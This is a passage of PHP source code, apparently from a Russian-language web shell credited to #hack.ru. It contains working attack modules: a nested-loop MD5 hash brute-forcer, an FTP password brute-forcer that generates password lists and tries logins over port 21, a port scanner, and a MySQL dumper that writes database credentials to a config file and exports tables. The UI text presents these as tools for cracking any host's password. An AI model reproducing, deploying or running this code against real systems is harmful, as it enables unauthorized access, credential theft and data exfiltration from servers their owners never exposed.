 <td class=pagetitle width=100>&nbsp;Ввод:&nbsp;<font color=red><b>".$crc32."</b></font></td></tr>
 <tr><td align=center width=400><input class='inputbox' type='text' name='crc32' size='50' value='' id='crc32'></td><td width=100 align=center><input type='submit' value='Crypt CRC32' class=button1 $style_button></td></tr>
 
 </form></table>";
 
 }

function decrypte() {
 global $action,$pass_de,$chars_de,$dat,$date;
set_time_limit(0);
ignore_user_abort(1);

echo "<br>
<TABLE CELLPADDING=0 CELLSPACING=0 bgcolor=#184984 BORDER=1 width=500 align=center bordercolor=#808080 bordercolorlight=black bordercolordark=white>
<tr><td align=center class=pagetitle><b>Декодирование данных</b></font></b></td></tr>
<tr><td bgcolor=#FFFFCC><br><blockquote>Всем известно, что md5 нельзя мгновенно декодировать, так как используется однонаправленное шифрование (алгоритм хэширования), 
 создающее уникальный отпечаток исходный строки, а именно 128-битовый (md5). В настоящее время считается невозможным по этому отпечатку
 востановить исходные данные, обратив процедуру, я же попробую применить метод «грубой силы», а именно полный перебор до совпадения входных и выходных данных.</blockquote></td></tr>
</table>";

if($chars_de==""){$chars_de="";}
 echo "
 <TABLE CELLPADDING=0 CELLSPACING=0 bgcolor=#184984 BORDER=1 width=500 align=center bordercolor=#808080 bordercolorlight=black bordercolordark=white>
 <form action='$PHP_SELF?action=decrypte' method=post name=hackru><tr><td align=left valign=top colspan=3 class=pagetitle>
 &nbsp;&nbsp;<b>Дешифровка данных:</b></td></tr>
 <tr> <tr><td align=left valign=top colspan=3 bgcolor=#FFFFCC width=500>
 &nbsp;&nbsp;<b>Decrypte MD5</b>(расшифровка хеша зависит от длины пароля и заниает определенное колличсетво времени)</td></tr>
 <tr>
 <td class=pagetitle width=400 >&nbsp;MD5 хеш:&nbsp;&nbsp;<font color=#ffffcc><b>".$pass_de."</b></font></td><td width=100 align=center>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<input type=reset value=Очистить class=button1 $style_button></td>
  <tr><td align=left width=400 >&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<textarea  class='inputbox' name='chars_de' cols='50' rows='5'>".$chars_de."</textarea></td>
  <td class=pagetitle width=120 valign=top><b>Перебор букв:</b><br><font color=red><b><u>ENG:</u></b></font>
   <a class=menu href=javascript:ins('abcdefghijklmnopqrstuvwxyz')>[a-z]</a>
<a class=menu href=javascript:ins('ABCDEFGHIJKLMNOPQRSTUVWXYZ')>[A-Z]</a>
<a class=menu href=javascript:ins('0123456789')>[0-9]</a>
<a class=menu href=javascript:ins('~`\!@#$%^&*()-_+=|/?&gt;<[]{}:№.,&quot;')>[Символы]</a><br><br>
<font color=red><b><u>RUS:</u></b></font>
<a class=menu href=javascript:ins('абвгдеёжзийклмнопрстуфхцчшщъыьэюя')>[а-я]</a>
<a class=menu href=javascript:ins('АБВГДЕЁЖЗИЙКЛМНОПРСТУФХЦЧШЩЪЫЬЭЮЯ')>[А-Я]</a>
</td></tr>
<tr><td align=center width=400>
<input class='inputbox' type='text' name='pass_de' size=50 onclick=this.value=''></td><td width=100 align=center><input type='submit' value='Decrypt MD5' class=button1 $style_button>
</td></tr>
 
 </form></table>";


if($_POST[pass_de]){
$pass_de=htmlspecialchars($pass_de);
$pass_de=stripslashes($pass_de);
$dat=date("H:i:s");
$date=date("d:m:Y");

crack_md5();
}
} 

function crack_md5() {
global $chars_de;
$chars=$_POST[chars];
set_time_limit(0);
ignore_user_abort(1);
$chars_de=str_replace("<",chr(60),$chars_de);
$chars_de=str_replace(">",chr(62),$chars_de);
$c=strlen($chars_de);
for ($next = 0; $next <= 31; $next++) {
for ($i1 = 0; $i1 <= $c; $i1++) {
$word[1] = $chars_de{$i1};
for ($i2 = 0; $i2 <= $c; $i2++) {
$word[2] = $chars_de{$i2};
if ($next <= 2) {
result(implode($word));
}else {
for ($i3 = 0; $i3 <= $c; $i3++) {
$word[3] = $chars_de{$i3};
if ($next <= 3) {
result(implode($word));
}else {
for ($i4 = 0; $i4 <= $c; $i4++) {
$word[4] = $chars_de{$i4};
if ($next <= 4) {
result(implode($word));
}else {
for ($i5 = 0; $i5 <= $c; $i5++) {
$word[5] = $chars_de{$i5};
if ($next <= 5) {
result(implode($word));
}else {
for ($i6 = 0; $i6 <= $c; $i6++) {
$word[6] = $chars_de{$i6};
if ($next <= 6) {
result(implode($word));
}else {
for ($i7 = 0; $i7 <= $c; $i7++) {
$word[7] = $chars_de{$i7};
if ($next <= 7) {
result(implode($word));
}else {
for ($i8 = 0; $i8 <= $c; $i8++) {
$word[8] = $chars_de{$i8};
if ($next <= 8) {
result(implode($word));
}else {
for ($i9 = 0; $i9 <= $c; $i9++) {
$word[9] = $chars_de{$i9};
if ($next <= 9) {
result(implode($word));
}else {
for ($i10 = 0; $i10 <= $c; $i10++) {
$word[10] = $chars_de{$i10};
if ($next <= 10) {
result(implode($word));
}else {
for ($i11 = 0; $i11 <= $c; $i11++) {
$word[11] = $chars_de{$i11};
if ($next <= 11) {
result(implode($word));
}else {
for ($i12 = 0; $i12 <= $c; $i12++) {
$word[12] = $chars_de{$i12};
if ($next <= 12) {
result(implode($word));
}else {
for ($i13 = 0; $i13 <= $c; $i13++) {
$word[13] = $chars_de{$i13};
if ($next <= 13) {
result(implode($word));
}else {
for ($i14 = 0; $i14 <= $c; $i14++) {
$word[14] = $chars_de{$i14};
if ($next <= 14) {
result(implode($word));
}else {
for ($i15 = 0; $i15 <= $c; $i15++) {
$word[15] = $chars_de{$i15};
if ($next <= 15) {
result(implode($word));
}else {
for ($i16 = 0; $i16 <= $c; $i16++) {
$word[16] = $chars_de{$i16};
if ($next <= 16) {
result(implode($word));
}else {
for ($i17 = 0; $i17 <= $c; $i17++) {
$word[17] = $chars_de{$i17};
if ($next <= 17) {
result(implode($word));
}else {
for ($i18 = 0; $i18 <= $c; $i18++) {
$word[18] = $chars_de{$i18};
if ($next <= 18) {
result(implode($word));
}else {
for ($i19 = 0; $i19 <= $c; $i19++) {
$word[19] = $chars_de{$i19};
if ($next <= 19) {
result(implode($word));
}else {
for ($i20 = 0; $i20 <= $c; $i20++) {
$word[20] = $chars_de{$i20};
if ($next <= 20) {
result(implode($word));
}else {
for ($i21 = 0; $i21 <= $c; $i21++) {
$word[21] = $chars_de{$i21};
if ($next <= 21) {
result(implode($word));
}else {
for ($i22 = 0; $i22 <= $c; $i22++) {
$word[22] = $chars_de{$i22};
if ($next <= 22) {
result(implode($word));
}else {
for ($i23 = 0; $i23 <= $c; $i23++) {
$word[23] = $chars_de{$i23};
if ($next <= 23) {
result(implode($word));
}else {
for ($i24 = 0; $i24 <= $c; $i24++) {
$word[24] = $chars_de{$i24};
if ($next <= 24) {
result(implode($word));
}else {
for ($i25 = 0; $i25 <= $c; $i25++) {
$word[25] = $chars_de{$i25};
if ($next <= 25) {
result(implode($word));
}else {
for ($i26 = 0; $i26 <= $c; $i26++) {
$word[26] = $chars_de{$i26};
if ($next <= 26) {
result(implode($word));
}else {
for ($i27 = 0; $i27 <= $c; $i27++) {
$word[27] = $chars_de{$i27};
if ($next <= 27) {
result(implode($word));
}else {
for ($i28 = 0; $i28 <= $c; $i28++) {
$word[28] = $chars_de{$i28};
if ($next <= 28) {
result(implode($word));
}else {
for ($i29 = 0; $i29 <= $c; $i29++) {
$word[29] = $chars_de{$i29};
if ($next <= 29) {
result(implode($word));
}else {
for ($i30 = 0; $i30 <= $c; $i30++) {
$word[30] = $chars_de{$i30};
if ($next <= 30) {
result(implode($word));
}else {
for ($i31 = 0; $i31 <= $c; $i31++) {
$word[31] = $chars_de{$i31};
if ($next <= 31) {
result(implode($word));

}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}

function result($word) {
global $dat,$date;
$pass_de=$_POST[pass_de];
$dat2=date("H:i:s");
$date2=date("d:m:Y");

if(md5($word)==$pass_de){ 
print "
<TABLE CELLPADDING=0 CELLSPACING=0 bgcolor=#184984 BORDER=1 width=500 align=center bordercolor=#808080 bordercolorlight=black bordercolordark=white>
  <tr><td align=left valign=top colspan=2 bgcolor=#FFFFCC>&nbsp;&nbsp; Результат выполнения перебора паролей:</td></tr>
  <tr><td class=pagetitle width=400>&nbsp;&nbsp;<b>Захешированный пароль:</b></td><td class=pagetitle width=100><font color=red>&nbsp;&nbsp;<b>$word</b></font></td></tr>
  <tr><td class=pagetitle width=200>&nbsp;&nbsp;<b>Начало перебора:</b></td><td class=pagetitle width=200><font color=#ffffcc>&nbsp;&nbsp;<b>$dat - $date</b></font></td></tr>
  <tr><td class=pagetitle width=200>&nbsp;&nbsp;<b>Окончание перебора:</b></td><td class=pagetitle width=200><font color=#ffffcc>&nbsp;&nbsp;<b>$dat2 - $date2</b></font></td></tr>
  <tr><td align=left valign=top colspan=2 bgcolor=#FFFFCC>&nbsp;&nbsp;Выполнение перебора хешей записан в файл:  <b>".$word."_md5</b></td></tr>
</table>
                            ";
							$f=@fopen($word._md5,"a+");
                            fputs($f,"Хэш из MD5 [$pass_de] = $word\nНачало перебора:\t$dat - $date\nОкончание перебора:\t$dat2 - $date2\n ");
                             exit;}



}

function brut_ftp() {
 global $action,$private_site, $title_exp,$login, $host, $file, $chislo, $proverka;
set_time_limit(0);
ignore_user_abort(1);
echo "<br>
<TABLE CELLPADDING=0 CELLSPACING=0 bgcolor=#184984 BORDER=1 width=500 align=center bordercolor=#808080 bordercolorlight=black bordercolordark=white>
<tr><td align=center class=pagetitle><b>Брутфорсер ФТП</b></font></b></td></tr>
<tr><td bgcolor=#FFFFCC><br><blockquote>С помощью данного брутфорсера вы сможете подобрать пароль к любому хостингу без проблем, чтобы было что перебирать я добавил базу
паролей, которая генерируется на лету ( не пишите большие цифры в <b>колличестве паролей</b> так как это серьезная нагрузка на сервер 10000 вполне хватит) . </blockquote></td></tr>
</table>";

 echo "
 <TABLE CELLPADDING=0 CELLSPACING=0 bgcolor=#184984 BORDER=1 width=500 align=center bordercolor=#808080 bordercolorlight=black bordercolordark=white>
 <form action='$PHP_SELF?action=brut_ftp' method=post><tr><td align=left valign=top colspan=3 class=pagetitle>
 &nbsp;&nbsp;<b>Brut FTP:</b></td></tr>
 <tr> <tr><td align=left valign=top colspan=3 bgcolor=#FFFFCC width=500>
 &nbsp;&nbsp;<b>Brutforcer Ftp</b>(полноценный брутфорсер, который работает по методу подстановки паролей, которые берет из файла, файл генерируется сам, вы только указываете число паролей и все перебор начинается!!!)</td></tr>
<tr><td align=center class=pagetitle width=150>&nbsp;&nbsp;FTPHost:</td>
<td align=left width=350>&nbsp;&nbsp;&nbsp;
<input class='inputbox' type='text' name='host' size=50></td></tr>
<tr><td align=center class=pagetitle width=150>&nbsp;&nbsp;Login:</td>
<td align=left width=350>&nbsp;&nbsp;&nbsp;
<input class='inputbox' type='text' name='login' size=50></td></tr>
<tr><td align=center class=pagetitle width=150>&nbsp;&nbsp;Колличество паролей:</td>
<td align=left width=350>&nbsp;&nbsp;&nbsp;
<input class='inputbox' type='text' name='chislo' size=10></td></tr>
<tr><td align=center class=pagetitle width=150>&nbsp;&nbsp;Пароль для проверки:</td>
<td align=left width=350>&nbsp;&nbsp;&nbsp;
<input class='inputbox' type='text' name='proverka' size=50></td></tr>
<tr><td width=500 align=center colspan=2><input type='submit' value='Brut FTP' class=button1 $style_button>
</td></tr>
 
 </form></table>";
 
 
function s() {
   $word="qwrtypsdfghjklzxcvbnm";
   return $word[mt_rand(0,strlen($word)-1)];
}

function g() {
   $word="euioam";
   return $word[mt_rand(0,strlen($word)-2)];
}

function name0() {   return s().g().s();                        }
function name1() {   return s().g().s().g();                    }
function name2() {   return s().g().g().s();                    }
function name3() {   return s().s().g().s().g();                }
function name4() {   return g().s().g().s().g();                }
function name5() {   return g().g().s().g().s();                }
function name6() {   return g().s().s().g().s();                }
function name7() {   return s().g().g().s().g();                }
function name8() {   return s().g().s().g().g();                }
function name9() {   return s().g().s().g().s().g();            }
function name10() {   return s().g().s().s().g().s().s();        }
function name11() {   return s().g().s().s().g().s().s().g();        }

$cool=array(1,2,3,4,5,6,7,8,9,10,99,100,111,111111,666,1978,1979,1980,1981,1982,1983,1984,1985,1986,1987,1988,1989,1990,1991,1992,1993,1994,1995,1996,1997,1998,1999,2000,2001,2002,2003,2004,2005);
$cool2=array('q1w2e3','qwerty','qwerty111111','123456','1234567890','0987654321','asdfg','zxcvbnm','qazwsx','q1e3r4w2','q1r4e3w2','1q2w3e','1q3e2w','poiuytrewq','lkjhgfdsa','mnbvcxz','asdf','root','admin','admin123','lamer123','admin123456','administrator','administrator123','q1w2e3r4t5','root123','microsoft','muther','hacker','hackers','cracker');

function randword() {
   global $cool;
   $func="name".mt_rand(0,11);
   $func2="name".mt_rand(0,11);
   switch (mt_rand(0,11)) {
      case 0: return $func().mt_rand(5,99);
      case 1: return $func()."-".$func2();
      case 2: return $func().$cool[mt_rand(0,count($cool)-1)];
      case 3: return $func()."!".$func();
      case 4: return randpass(mt_rand(5,12));
      default: return $func();
   }
 
 
}

function randpass($len) {
   $word="qwertyuiopasdfghjklzxcvbnm1234567890";
   $s="";
   for ($i=0; $i<$len; $i++) {
      $s.=$word[mt_rand(0,strlen($word)-1)];
   }
   return $s;
}
if (@unlink("pass.txt") < 0){
echo "нету ничего";
exit;
}
$file="pass.txt"; 
if($file && $host && $login){
   $cn=mt_rand(30,30);
for ($i=0; $i<$cn; $i++) {
   $s=$cool2[$i];
   $f=@fopen(pass.".txt","a+");
   fputs($f,"$s\n");
   }
 
  $cnt2=mt_rand(43,43);
for ($i=0; $i<$cnt2; $i++) {
   $r=$cool[$i];
   $f=@fopen(pass.".txt","a+");
   fputs($f,"$login$r\n");
}    
$p="$proverka";
   $f=@fopen(pass.".txt","a+");
   fputs($f,"$p\n");
   
 $cnt3=mt_rand($chislo,$chislo);
   for ($i=0; $i<$cnt3; $i++) {
   $u=randword();
   $f=@fopen(pass.".txt","a+");
   fputs($f,"$u\n");
  } 
  
  if(is_file($file)){
 $passwd=file($file,1000);
  for($i=0; $i<count($passwd); $i++){
   $stop=false;
   $password=trim($passwd[$i]);
   $open_ftp=@fsockopen($host,21);
    if($open_ftp!=false){
     fputs($open_ftp,"user $login\n");
     fputs($open_ftp,"pass $password\n");
     while(!feof($open_ftp) && $stop!=true){
      $text=fgets($open_ftp,4096);
      if(preg_match("/230/",$text)){
       $stop=true;
	   $f=@fopen($host._ftp,"a+");
       fputs($f,"Enter on ftp:\nFTPhosting:\t$host\nLogin:\t$login\nPassword:\t$password\n ");

       echo "
	   	<TABLE CELLPADDING=0 CELLSPACING=0 bgcolor=#184984 BORDER=1 width=500 align=center bordercolor=#808080 bordercolorlight=black bordercolordark=white>
<tr><td align=center class=pagetitle><b><font color=\"blue\">Поздравляю!!! Пароль подобран.</font></b><br>
&nbsp;&nbsp;Конект: <b>$host</b><br>&nbsp;&nbsp;Логин: <b>$login</b><br>&nbsp;&nbsp;Пароль: <b>$password</b></td></tr></table>
";exit;
      }
      elseif(preg_match("/530/",$text)){
       $stop=true;
      
      }
     }
     fclose($open_ftp);
   }else{
    echo "
	<TABLE CELLPADDING=0 CELLSPACING=0 bgcolor=#184984 BORDER=1 width=500 align=center bordercolor=#808080 bordercolorlight=black bordercolordark=white>
<tr><td align=center class=pagetitle bgcolor=#FF0000><b>Не верно указано фтп хостинга!!! На <b><u>$host</u></b> закрыт 21 порт</b></b></td></tr>
</table>
";exit;
   }
  }
 }
}

}

# Портскан
function portscan() {
 global $action,$portscan,$port,$HTTP_HOST,$min,$max;

 $mtime = explode(" ",microtime());
 $mtime = $mtime[1] + $mtime[0];
 $time1 = $mtime;

 $id = $HTTP_HOST;
 echo "<br><TABLE CELLPADDING=0 CELLSPACING=0 width='600' bgcolor=#184984 BORDER=1 align=center bordercolor=#808080 bordercolorlight=black bordercolordark=white><tr><td align=center class=pagetitle><b>Результаты сканирования:</b>&nbsp;&nbsp;$id</td></tr><tr><td valign=top class=pagetitle >Сканируем хостинг на наличие открытых портов" . "...<br></td></tr></table>";

 $lport = $min; 
 $hport = $max; 
 $op = 0;
 $gp = 0;

 for ($porta=$lport; $porta<=$hport; $porta++) {
  $fp = @fsockopen("$id", $porta, &$errno, &$errstr, 4); 
  if ( !$fp ) { $gp++; }
  else {
   $port_addres = $port[$porta];
   if($port_addres == "") $port_addres = "unknown";
   $serv = getservbyport($porta, TCP);
   echo "<TABLE CELLPADDING=0 CELLSPACING=0 width='600' bgcolor=#FFFFCC BORDER=1 align=center bordercolor=#808080 bordercolorlight=black bordercolordark=white><tr><td align=center width=10%>Port:<b>$porta / $serv</b></td><td align=center width=80%>$port_addres</td><td align=center width=10%>(<a href=\"http://www.google.de/search?q=%22$port_addres2%22&ie=ISO-8859-1&hl=de&btnG=Google+Suche&meta=\" target=_blank>Что это?</a>)</td></tr>";
   $op++;
  } 
 } 

 if($op == 0) echo "<TABLE CELLPADDING=0 CELLSPACING=0 width='600' bgcolor=#184984 BORDER=1 align=center bordercolor=#808080 bordercolorlight=black bordercolordark=white><tr><td align=center class=pagetitle><b>На данном хостинге нет открытых портов</b></td></tr></table>";

 $unsi = ($op/$porta)*100;
 $unsi = round($unsi);

 echo "<tr><td align=center width=100% bgcolor=#184984 class=pagetitle colspan=3><b>Статистика сканирования:</b></b></td></tr>";
 echo "<tr><td align=center width=100% colspan=3><b>Просканированных портов:</b>&nbsp;&nbsp;$porta</td></tr>";
 echo "<tr><td align=center width=100% colspan=3><b>Открытых портов:</b>&nbsp;&nbsp;$op</td></tr>";
 echo "<tr><td align=center width=100% colspan=3><b>Закрытых портов:</b>&nbsp;&nbsp;$gp</td></tr>";

 $mtime = explode(" ",microtime());
 $mtime = $mtime[1] + $mtime[0];
 $time2 = $mtime;
 $loadtime = ($time2 - $time1); 
 $loadtime = round($loadtime, 2); 

 echo "<tr colspan=2><td align=center width=100% colspan=3><b>Время сканирования:</b>&nbsp;&nbsp;$loadtime секунд</tr></table>";
}

function nfm_copyright() {
global $action;
 return "<br><TABLE CELLPADDING=0 CELLSPACING=0 bgcolor=#ffffcc BORDER=1 width=600 align=center bordercolor=#808080 bordercolorlight=black bordercolordark=white><tr><td><center><font color='#000000' face='Tahoma' size = 2><b>Powered by channel #hack.ru (author xoce). Made In Russia </b></font></center></td></tr></table></body></html>";
  
}

// =-=-=-=-= SQL MODULE =-=-=-=-=
// SQL functions start
function aff_date() {
 $date_now=date("F j,Y,g:i a");
 return $date_now;
} 

function sqldumptable($table) {
 global $sv_s,$sv_d,$drp_tbl;
 $tabledump = "";
 if ($sv_s) {
  if ($drp_tbl) { $tabledump.="DROP TABLE IF EXISTS $table;\n"; } 
  $tabledump.="CREATE TABLE $table (\n";
  $firstfield=1;
  $champs=mysql_query("SHOW FIELDS FROM $table");
  while ($champ=mysql_fetch_array($champs)) {
   if (!$firstfield) { $tabledump.=",\n"; } 
   else { $firstfield=0;}
   $tabledump.=" $champ[Field] $champ[Type]";
   if ($champ['Null'] !="YES") { $tabledump.=" NOT NULL";} 
   if (!empty($champ['Default'])) { $tabledump.=" default '$champ[Default]'";} 
   if ($champ['Extra'] !="") { $tabledump.=" $champ[Extra]";}
  }
  
  @mysql_free_result($champs);
  $keys=mysql_query("SHOW KEYS FROM $table");
  while ($key=mysql_fetch_array($keys)) {
   $kname=$key['Key_name'];
   if ($kname !="PRIMARY" and $key['Non_unique']==0) { $kname="UNIQUE|$kname";}
   if(!is_array($index[$kname])) { $index[$kname]=array();}
   $index[$kname][]=$key['Column_name'];
  }
 
  @mysql_free_result($keys);
  while(list($kname,$columns)=@each($index)) {
   $tabledump.=",\n";
   $colnames=implode($columns,",");
   if($kname=="PRIMARY") { $tabledump.=" PRIMARY KEY ($colnames)";}
   else {
    if (substr($kname,0,6)=="UNIQUE") { $kname=substr($kname,7);}
    $tabledump.=" KEY $kname ($colnames)";
   }
  }
  $tabledump.="\n);\n\n";
 }

 if ($sv_d) {
  $rows=mysql_query("SELECT * FROM $table");
  $numfields=mysql_num_fields($rows);
  while ($row=mysql_fetch_array($rows)) {
   $tabledump.="INSERT INTO $table VALUES(";
   $cptchamp=-1;
   $firstfield=1;
   while (++$cptchamp<$numfields) {
    if (!$firstfield) { $tabledump.=",";} 
    else { $firstfield=0;}
    if (!isset($row[$cptchamp])) {$tabledump.="NULL";} 
    else { $tabledump.="'".mysql_escape_string($row[$cptchamp])."'";}
   }
   $tabledump.=");\n";
  }
  @mysql_free_result($rows);
 } 

 return $tabledump;
} 

function csvdumptable($table) {
 global $sv_s,$sv_d;
 $csvdump="## Table:$table \n\n";
 if ($sv_s) {
  $firstfield=1;
  $champs=mysql_query("SHOW FIELDS FROM $table");
  while ($champ=mysql_fetch_array($champs)) {
   if (!$firstfield) { $csvdump.=",";} 
   else { $firstfield=0;}
   $csvdump.="'".$champ['Field']."'";
  }

  @mysql_free_result($champs);
  $csvdump.="\n";
 }

 if ($sv_d) {
  $rows=mysql_query("SELECT * FROM $table");
  $numfields=mysql_num_fields($rows);
  while ($row=mysql_fetch_array($rows)) {
   $cptchamp=-1;
   $firstfield=1;
   while (++$cptchamp<$numfields) { 
    if (!$firstfield) { $csvdump.=",";} 
    else { $firstfield=0;}
    if (!isset($row[$cptchamp])) { $csvdump.="NULL";}
    else { $csvdump.="'".addslashes($row[$cptchamp])."'";}
   }
   $csvdump.="\n";
  }
 }

 @mysql_free_result($rows);
 return $csvdump;
} 

function write_file($data) {
 global $g_fp,$file_type;
 if ($file_type==1) { gzwrite($g_fp,$data); }
 else { fwrite ($g_fp,$data); }
}

function open_file($file_name) {
 global $g_fp,$file_type,$dbbase,$f_nm;
 if ($file_type==1) { $g_fp=gzopen($file_name,"wb9"); } 
 else { $g_fp=fopen ($file_name,"w"); } 

 $f_nm[]=$file_name;
 $data="";
 $data.="##\n";
 $data.="## NFM hack.ru creator \n";
 $data.="##-------------------------\n";
 $data.="## Date:".aff_date()."\n";
 $data.="## Base:$dbbase \n";
 $data.="##-------------------------\n\n";
 write_file($data);
 unset($data);
}
 
function file_pos() {
 global $g_fp,$file_type;
 if ($file_type=="1") { return gztell ($g_fp); }
 else { return ftell ($g_fp); }
}
 
function close_file() {
 global $g_fp,$file_type;
 if ($file_type=="1") { gzclose ($g_fp); }
 else { fclose ($g_fp); }
}

function split_sql_file($sql) {
 $morc=explode(";",$sql);
 $sql="";
 $output=array();
 $matches=array();
 $morc_cpt=count($morc);
 for ($i=0;$i < $morc_cpt;$i++) {
  if (($i !=($morc_cpt-1)) || (strlen($morc[$i] > 0))) {
   $total_quotes=preg_match_all("/'/",$morc[$i],$matches);
   $escaped_quotes=preg_match_all("/(?<!\\\\)(\\\\\\\\)*\\\\'/",$morc[$i],$matches);
   $unescaped_quotes=$total_quotes-$escaped_quotes;
   if (($unescaped_quotes % 2)==0) { $output[]=$morc[$i]; $morc[$i]=""; }
   else {
    $temp=$morc[$i].";";
    $morc[$i]="";
    $complete_stmt=false;
    for ($j=$i+1;(!$complete_stmt && ($j < $morc_cpt));$j++) {
     $total_quotes = preg_match_all("/'/",$morc[$j],$matches);
     $escaped_quotes=preg_match_all("/(?<!\\\\)(\\\\\\\\)*\\\\'/",$morc[$j],$matches);
     $unescaped_quotes=$total_quotes-$escaped_quotes;
     if (($unescaped_quotes % 2)==1) {
      $output[]=$temp.$morc[$j];
      $morc[$j]="";
      $temp="";
      $complete_stmt=true;
      $i=$j;
     } else {
      $temp.=$morc[$j].";";
      $morc[$j]="";
     }
    }
   }
  }
 }
 return $output;
} 

function split_csv_file($csv) { return explode("\n",$csv); }
// SQL functions END

// main SQL()
function sql() {
 global $sqlaction,$sv_s,$sv_d,$drp_tbl,$g_fp,$file_type,$dbbase,$f_nm;
 $secu_config="xtdump_conf.inc.php";
 $dbhost=$_POST['dbhost'];
 $dbuser=$_POST['dbuser'];
 $dbpass=$_POST['dbpass'];
 $dbbase=$_POST['dbbase'];
 $tbls =$_POST['tbls'];
 $sqlaction =$_POST['sqlaction'];
 $secu =$_POST['secu'];
 $f_cut =$_POST['f_cut'];
 $max_sql =$_POST['max_sql'];
 $opt =$_POST['opt'];
 $savmode =$_POST['savmode'];
 $file_type =$_POST['file_type'];
 $ecraz =$_POST['ecraz'];
 $f_tbl =$_POST['f_tbl'];
 $drp_tbl=$_POST['drp_tbl'];

 $header="<center><table width=620 cellpadding=0 cellspacing=0 align=center><col width=1><col width=600><col width=1><tr><td></td><td align=left class=texte><br>";
 $footer="<center><a href='javascript:history.go(-1)' target='_self' class=link>-назад-</a><br></center><br></td><td></td></tr><tr><td height=1 colspan=3></td></tr></table></center>".nfm_copyright();

 // SQL actions STARTS

 if ($sqlaction=='save') {
  if ($secu==1) {
   $fp=fopen($secu_config,"w");
   fputs($fp,"<?php\n");
   fputs($fp,"\$dbhost='$dbhost';\n");
   fputs($fp,"\$dbbase='$dbbase';\n");
   fputs($fp,"\$dbuser='$dbuser';\n");
   fputs($fp,"\$dbpass='$dbpass';\n");
   fputs($fp,"?>");
   fclose($fp);
  }
  if (!is_array($tbls)) {
   echo $header."
<br><center><font color=red>ТЫ ЗАБЫЛ выделить нужные тебе таблицы для дампинга =)</b></font></center>\n$footer";
   exit;
  }
  if($f_cut==1) {
   if (!is_numeric($max_sql)) {
    echo $header."<br><center><font color=red><b>Ошибка.</b></font></center>\n$footer";
    exit;
   }
   if ($max_sql < 200000) {
    echo $header."<br><center><font color=red><b>база sql больше 200 000 мб</b></font></center>\n$footer";
    exit;
   }
  } 
 
  $tbl=array();
  $tbl[]=reset($tbls);
  if (count($tbls) > 1) {
   $a=true;
   while ($a !=false) {
    $a=next($tbls);
    if ($a !=false) { $tbl[]=$a; } 
   }
  }
 
  if ($opt==1) { $sv_s=true; $sv_d=true; }
  else if ($opt==2) { $sv_s=true;$sv_d=false;$fc ="_struct"; } 
  else if ($opt==3) { $sv_s=false;$sv_d=true;$fc ="_data"; }
  else { exit; }
 
  $fext=".".$savmode;
  $fich=$dbbase.$fc.$fext;
  $dte="";
  if ($ecraz !=1) { $dte=date("dMy_Hi")."_"; } $gz="";
  if ($file_type=='1') { $gz.=".gz"; }
  $fcut=false;
  $ftbl=false;
  $f_nm=array();
  if($f_cut==1) { $fcut=true;$max_sql=$max_sql;$nbf=1;$f_size=170;}
  if($f_tbl==1) { $ftbl=true; }
  else {
   if(!$fcut) { open_file("dump_".$dte.$dbbase.$fc.$fext.$gz); }
   else { open_file("dump_".$dte.$dbbase.$fc."_1".$fext.$gz); }
  }
 
  $nbf=1;
  mysql_connect($dbhost,$dbuser,$dbpass);
  mysql_select_db($dbbase);
  if ($fext==".sql") {
   if ($ftbl) { 		
    while (list($i)=each($tbl)) {
     $temp=sqldumptable($tbl[$i]);
     $sz_t=strlen($temp);
     if ($fcut) {
      open_file("dump_".$dte.$tbl[$i].$fc.".sql".$gz);
      $nbf=0;
      $p_sql=split_sql_file($temp);
      while(list($j,$val)=each($p_sql)) {
       if ((file_pos()+6+strlen($val)) < $max_sql) { write_file($val.";"); }
       else { close_file(); $nbf++; open_file("dump_".$dte.$tbl[$i].$fc."_".$nbf.".sql".$gz); write_file($val.";"); }
      }
      close_file();
     }
     else { open_file("dump_".$dte.$tbl[$i].$fc.".sql".$gz);write_file($temp."\n\n");close_file();$nbf=1; }
     $tblsv=$tblsv."<b>".$tbl[$i]."</b>,<br>";
    }
   } else {
    $tblsv="";
    while (list($i)=each($tbl)) {
     $temp=sqldumptable($tbl[$i]);
     $sz_t=strlen($temp);
     if ($fcut && ((file_pos()+$sz_t) > $max_sql)) {
      $p_sql=split_sql_file($temp);
      while(list($j,$val)=each($p_sql)) {
       if ((file_pos()+6+strlen($val)) < $max_sql) { write_file($val.";"); }
       else {
        close_file();
        $nbf++;
        open_file("dump_".$dte.$dbbase.$fc."_".$nbf.".sql".$gz);
        write_file($val.";");
       }
      }
     } else { write_file($temp); }
     $tblsv=$tblsv."<b>".$tbl[$i]."</b>,<br>";
    }
   }
  }
  else if ($fext==".csv") {
   if ($ftbl) {
    while (list($i)=each($tbl)) {
     $temp=csvdumptable($tbl[$i]);
     $sz_t=strlen($temp);
     if ($fcut) {
      open_file("dump_".$dte.$tbl[$i].$fc.".csv".$gz);
      $nbf=0;
      $p_csv=split_csv_file($temp);
      while(list($j,$val)=each($p_csv)) {
       if ((file_pos()+6+strlen($val)) < $max_sql) { write_file($val."\n"); }
       else {
        close_file();
        $nbf++;
        open_file("dump_".$dte.$tbl[$i].$fc."_".$nbf.".csv".$gz);
        write_file($val."\n");
       }
      }
      close_file();
     } else {
      open_file("dump_".$dte.$tbl[$i].$fc.".csv".$gz);
      write_file($temp."\n\n");
      close_file();
      $nbf=1;
     }
     $tblsv=$tblsv."<b>".$tbl[$i]."</b>,<br>";
    }
   } else {
    while (list($i)=each($tbl)) {
     $temp=csvdumptable($tbl[$i]);
     $sz_t=strlen($temp);
     if ($fcut && ((file_pos()+$sz_t) > $max_sql)) {
      $p_csv=split_sql_file($temp);
      while(list($j,$val)=each($p_csv)) {
       if ((file_pos()+6+strlen($val)) < $max_sql) { write_file($val."\n"); }
       else {
        close_file();
        $nbf++;
        open_file("dump_".$dte.$dbbase.$fc."_".$nbf.".csv".$gz);
        write_file($val."\n");
       }
      }
     } else { write_file($temp); }
     $tblsv=$tblsv."<b>".$tbl[$i]."</b>,<br>";
    }
   }
  }

  mysql_close();
  if (!$ftbl) { close_file(); }

  echo $header;
